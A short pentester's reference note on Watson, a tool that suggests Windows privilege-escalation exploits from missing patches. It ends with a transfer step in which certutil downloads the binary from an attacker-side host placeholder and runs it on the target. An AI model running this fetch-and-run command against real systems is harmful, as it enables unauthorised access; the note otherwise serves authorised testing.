---
tags: [tool, privesc, windows, exploit]
tool: "watson"
category: "Privesc"
installed: true
phase: [privesc]
---

# Watson - Windows 10/11 Exploit Suggester

## Tool Overview
Purpose: C# tool to suggest missing patches for Windows 10/11 and Server 2016/2019/2022
Location: ~/tools/privesc/windows/Watson/

## When to Use
- On modern Windows systems (10/11, Server 2016+)
- When Sherlock doesn't work
- For .NET-based execution

## How to Use It

Compile (on Kali):
sudo apt install mono-mcs
mcs -out:Watson.exe Watson.sln

Or download pre-compiled:
wget https://github.com/rasta-mouse/Watson/releases/latest/download/Watson.exe

Run on Target:
Watson.exe

Transfer to Target:
On Kali: cd ~/tools/privesc/windows/Watson && python3 -m http.server 8000
On target: certutil -urlcache -f http://YOUR_IP:8000/Watson.exe Watson.exe && Watson.exe

## Related Tools
sherlock, windows-exploit-suggester
